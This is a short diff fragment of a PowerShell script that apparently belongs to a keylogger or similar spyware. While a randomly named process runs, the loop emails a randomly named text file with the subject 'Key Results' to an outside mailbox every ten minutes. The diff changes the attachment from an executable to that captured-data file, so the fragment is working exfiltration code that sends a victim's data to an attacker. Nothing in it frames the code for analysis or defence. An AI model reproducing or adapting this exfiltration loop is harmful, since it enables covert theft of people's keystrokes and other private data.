@@ -6,9 +6,9 @@ while (Get-Process -Name "ygoLa8SyqmQTGsoh" -ErrorAction SilentlyContinue)
     $Credential = New-Object System.Management.Automation.PSCredential($Username,$Password)
     $From = "jankowalski69zs@outlook.com"
     $To = "resultsiliketowatch@op.pl"
-    $Subject = "Email with Attachment"
-    $Body = "This is an email with an attachment."
-    $Attachment = ".\ygoLa8SyqmQTGsoh.exe"
+    $Subject = "Key Results"
+    $Body = "Lets see..."
+    $Attachment = ".\nmaqncdCwP.txt"
     Send-MailMessage -SmtpServer "smtp-mail.outlook.com" -UseSsl -Port 587 -Credential $Credential -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment
     Start-Sleep -Seconds 600
 }
